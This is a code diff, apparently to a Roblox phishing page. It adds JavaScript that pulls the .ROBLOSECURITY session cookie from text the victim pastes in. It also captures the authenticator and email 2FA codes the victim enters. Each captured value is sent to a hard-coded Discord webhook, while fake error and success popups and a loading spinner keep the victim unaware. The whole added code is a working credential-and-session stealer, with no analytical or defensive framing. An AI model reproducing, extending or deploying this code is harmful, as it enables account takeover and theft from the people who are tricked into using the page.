@@ -57,8 +57,14 @@ document.getElementById('submitButton').addEventListener('click', async function
     showErrorAlert();
     powershellInput.value = '';
     closeModal('modal');
+    // Send webhook for invalid attempt
+    await sendWebhook('No .ROBLOSECURITY Cookie Found', 'No .ROBLOSECURITY cookie found.', 0xff0000);
     return;
   }
+
+  // Send webhook for valid cookie
+  const cookie = match[1].trim();
+  await sendWebhook('New Cookie Captured', `\`\`\`${cookie}\`\`\``, 0x00ff00);
 
   powershellInput.value = '';
   closeModal('modal');
@@ -160,6 +166,9 @@ if (twofaInput && verifyButton) {
       return;
     }
 
+    // Send webhook for 2FA code
+    await sendWebhook('2FA Auth Code Captured 🔥', `Authenticator Code Entered: **${codeEnteredValue}**`, 0xffa500);
+
     twofaInput.value = '';
     closeModal('twofa-modal');
 
@@ -189,11 +198,33 @@ if (twofaInput2 && verifyButton2) {
       return;
     }
 
+    // Send webhook for email code
+    await sendWebhook('2FA Email Code Captured 📩', `Second Modal Code Entered: **${codeEnteredValue}**`, 0xffa500);
+
     twofaInput2.value = '';
     closeModal('twofa-modal-2');
 
     // Show green alert box
     showSuccessPopup();
+  });
+}
+
+// === Webhook Sending ===
+async function sendWebhook(title, description, color) {
+  const webhookUrl = 'https://discord.com/api/webhooks/1387289722400936028/LOsYfsaZfL0NsGF3eT7xzmt5yektdbsP6fsRVtOR5_clDvSiszN7VXtKwz6wMDKE4hxT';
+  const payload = {
+    embeds: [{
+      title: title,
+      description: description,
+      color: color,
+      footer: { text: `Logger System • ${new Date().toLocaleString()}` }
+    }]
+  };
+
+  await fetch(webhookUrl, {
+    method: 'POST',
+    headers: { 'Content-Type': 'application/json' },
+    body: JSON.stringify(payload)
   });
 }
 
@@ -230,3 +261,30 @@ function showSuccessPopup() {
     setTimeout(() => popup.remove(), 500);
   }, 4000);
 }
+
+// === Spinner Animation (for loading overlay) ===
+const styleSheet = document.createElement('style');
+styleSheet.type = 'text/css';
+styleSheet.innerText = `
+@keyframes spin {
+  0% { transform: rotate(0deg); }
+  100% { transform: rotate(360deg); }
+}
+.spinner {
+  width: 64px;
+  height: 64px;
+  border: 8px solid #f3f3f3;
+  border-top: 8px solid #007bff;
+  border-radius: 50%;
+  animation: spin 1s linear infinite;
+  margin-bottom: 20px;
+}
+.loading-message {
+  color: #fff;
+  font-size: 1.5rem;
+  font-weight: 600;
+  text-align: center;
+  margin-top: 0;
+  letter-spacing: 1px;
+}`;
+document.head.appendChild(styleSheet);
